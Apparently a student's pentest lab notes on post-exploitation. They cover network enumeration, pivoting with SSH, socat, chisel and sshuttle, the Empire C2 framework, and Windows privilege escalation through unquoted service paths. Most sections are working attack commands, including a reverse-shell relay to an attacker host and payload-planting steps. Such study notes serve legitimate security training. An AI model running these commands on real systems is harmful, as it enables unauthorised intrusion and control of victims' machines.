Living off the land by using already made tool or copy a static binary(search on the internet).

### enumeration in target network
You can use this: 
`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done` 
to ping sweep the local network.

Port scan can also be run natively with:
`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`
Though it is very slow

#### Proxychains
a proxy that can run command through proxy. Prepend the command after `proxychains` like:
```bash
proxychains nc 172.16.0.10 23
```
The proxy port is located in the conf file with this order:
1.  The current directory (i.e. `./proxychains.conf`)
2.  `~/.proxychains/proxychains.conf`
3.  `/etc/proxychains.conf`

### SSH tunnel
OpenSSH can be used to "tunnel" into the attacked machine, creating a port forward and/or proxies.
#### Forward Connections
Connect using ssh, if your target has SSH open.
- Port fowarding: use `-L` option, like this
```bash
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```
where `172.16.0.5` is target with SSH open and `172.16.0.10:80` is the pivot target. We can access the pivot target by going to `localhost:8000`, the 8000 port is 'fowarded' into the `172.16.0.10:80` machine.
`-f` make the ssh shell to go into the background immediately
`-N` just create the connection withouth running any command

- Proxy: use the `-D` switch. to open the proxy into the target machine with open SSH like this:
```bash
ssh -D 1337 user@172.16.0.5 -fN
```
Then the port 1337 is opened for proxy.
#### Reverse Connection
If the target SSH port is not open, you can connect the target to your machine using SSH to get a tunnel.
Use `ssh-keygen` to make a key pair, then add an entro of the public key to the `~/.ssh/authorized_keys` file
Create an entry like this to make it secure: `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` then the public key, so it looks like this:
![[055753470a05.png| 700]]

Start the SSH service  at the target if its inactive. then create a port forward with this command:
```bash
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```
Creating a proxy with this command:
```bash
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

#### plink
Because windows usually don't have ssh client, we use plink.exe, a windows command line version of PuTTY to make a tunnel. The command is this
```cmd.exe
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```
You need to convert the private key with the putty-tools first
```bash
sudo apt install putty-tools
puttygen KEYFILE -o OUTPUT_KEY.ppk
```
Then send the ppk file to the target windows.
Get the lattest plink.exe here: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

#### socat
A shell for windows and linux. Can be used for port forwarding. Get the static binaries:
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat For linux
https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download for windows.
##### reverse shell relay
Used for reverse shell from internal network of the target. The command:
```bash
nc -lvnp 443 # on attacker
./socat tcp-l:8000 tcp:ATTACKING_ip:443 & # on compromised host
```
##### port forwarding - easy
On compromised machine:
```bash
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```
Open port 33060 and forward it to target to pivot in 172.16.0.10 port 3306
##### port forwarding - quiet
Unlike the easy method, this one doesn't open a port in the compromised server.
```bash
socat tcp-l:8001 tcp-l:8000,f fork, resueaddr & #create local port relay, packet sent to 8000 goes out of port 8001
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT, fork & #run on compromised box, connecting to the attacker listening port 8001 and send it to TARGET_PORT port of TARGET_IP target
```
#### chisel
tools for proxy tunnel and port forwarding. https://github.com/jpillora/chisel/releases. The help menu `chisel client|server --help`
##### reverse SOCKS proxy
connect from compromised machine into a listening port on the attacker machine.
```bash
./chisel server -p LISTEN_PORT --reverse & #set in attacker
./chisel client ATTACKING_IP:LISTEN_PORT R:socks & #set in compromised host
```
The opened proxy port on our machine will be shown in the attacker terminal after the connection is established.
##### forward SOCKS proxy
Rarer because egress firewall(outbound traffic) are less stringent than ingress firewall(inbound traffic).
```bash
./chisel server -p LISTEN_PORT --socks5 # set on compromised host
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks #set on attacker
```
Compromised host open LISTEN_PORT. Attacker connect to listen port, and open proxy on PROXY_PORT.
##### remote port forward
connect from compromised host to listening attacker port.
```bash
./chisel server -p LISTEN PORT --reverse & #set on attacker
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & #set on compromised host
#example
./chisel server -p 1337 --reverse &
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```
The example will allow us access to 172.16.0.10:22 with 127.0.0.1:2222 on attacker machine.
##### local port forward
connect from attacker to listening compromised chisel server.
```bash
./chisel server -p LISTEN_PORT #set on compromised host
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT #set on attacker
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```
The example will allow us access to 172.16.0.10:22 with localhost:2222 on attacker machine

Kill background process with `jobs` then `kill %NUMBER`.

#### shuttle
tools to simulate VPN, allow use to route through proxy withouth the use of tools like proxychains. We can connect to devices in the target network as we would normally, connected to networked devices.
Can only work in linux, and need ssh access and python to be installed in the compromised machine.

Install shuttle with: `sudo apt install sshuttle`.

Run shuttle with:
```bash
sshuttle -r username@address subnet
sshutle -r user@172.16.0.5 172.16.0.0/24

sshuttle -r username@address -N #automatically determine the network

sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET #for connection with keys only
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5 # use -x for the compromised host so it will not disrupt the connection
```
connect to the 172.16.0.0/24 network through 172.16.0.5 compromised host.


### Command and Control(C2) Framework
C2 framework are used to consolidate attacker position within network and simplify post exploitation steps(privesc, AV evasion, pivoting, looting, etc).
https://www.thec2matrix.com/ list pros and cons of a lot of frameworks.
This room show the C2 Framework "Empire"

#### Empire
Empire have a client and server, and there is also <b>starkiller</b>, a GUI extension for empire.
Install the package:
```bash
apt install powershell-empire starkiller
```

Start with:
```bash
powershell-empire server #start the server
powershell-empire client #start the client
```
If the server is not in localhost, change it in `/usr/share/powershell-empire/empire/client/config.yaml` or use `connect HOSTNAME --username=USERNAME --password=PASSWORD` in the client.

Use starkiller by starting `starkiller` in terminal and username:empireadmin and password:password123

###### listener
Used to receive connection from stagers(the payloads that create reverse shell).
In CLI client:
```empire_client
uselistener LISTENER_NAME
uselistener http
```
it work similiarly like metasploit, `options` to see the option. `set OPTION VALUE` to set options. For listener set this:
```empire_client
set Name CLIHTTP
set Host 10.50.193.140
set Port 8000
```
`execute` to execute, `back` to exit out of this menu, or `main` to exit to the main menu.
`listeners` to see the listener.
`kill LISTENER_NAME` to kill it.

Use generate in starkiller and just input the required field.

##### stagers
stagers are empire payload. Used to connect back to the listener, creating an agent when executed. Generate in CLI with:
```empire_client
usestager STAGER_NAME
usestager multi/bash
```
for stager, we need to set Listener option with `set Listener LISTENER_NAME`.
then `execute` to get the base64ed script.

For starkiller just go to the stager page on the left panel and create.

##### agent
agent is the shell, we can start it by just running the main part of the stagers script or copy it and run the script.
`agents` to see all agent
`interact AGENT_NAME` to interact.
`kill AGENT_NAME` to kill agent

##### hop listener
as empire cannot go through proxy, we can use a relay that's called hop listener. We create a file that copied to the compromised host, and use it to jump to our listener. Set `Redirectlistener`(our normal listener(http in this example)), 
`Host`(the compromised host),
and `Port`(the port on the compromised host).
`execute` and it will create a directory on our `/tmp`. Copy the file and its structure to the compromised host.

##### modules
modules is the post-exploitation tools. example is mimikatz
use with `usemodule MODULE_NAME`. 
The example used is sherlock(`/powershell/privesc/sherlock`) used for searching privesc target.

### php development webserver
can be used to serve php payload fast.
run `php -S 0.0.0.0:PORT &>/dev/null &` in the designated directory.

### Antivirus Evasion
First step, we would try fingerprinting the AV on the target. Its usually done by social engineering, or if we have a shell on the target we can use https://github.com/PwnDexter/SharpEDRChecker or https://github.com/GhostPack/Seatbelt.
After we know, we can emulate it in a VM, to try to bypass that AV.


### Window privilege escalation
#### unquoted service path
This work because windows will look at path withouth double quote with space in it with some weirdness, for example: `C:\Directory one\Directory two\service` will be loaded in this order:
1. `C:\Directory.exe`
2. `C:\Directory one\Directory.exe`
3. `C:\Directory one\Directory two\service` the actual service.
So we can intercept the first and second order and place our payload there.
Check non-default service with this command:
`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
Look for a service with a local system account, then check if we can write in one of those directory with:
`powershell "get-acl -Path 'C:\Directory one\' | format-list"`
Match it with our current privilege.

Copy our file to the vulnerable location, stop the actual service with:
`sc stop SERVICE_NAME`(function as an attempt to know if we can manipulate service)
then start it to run our payload
`sc start SERVICE_NAME`

### Reports
Some example of reports: https://github.com/juliocesarfort/public-pentesting-reports
So, the sections should be:

1.  Executive Summary: Summary for executive, non technical
2.  Timeline: all your step to get the vulnerability
3.  Findings and Remediations : self explanatory
4.  Attack Narrative: technical step by step
5.  Cleanup: what you do for cleanup
6.  Conclusion
7.  References
8.  Appendices

Use https://www.first.org/cvss/calculator/3.1 for vunlerability score.

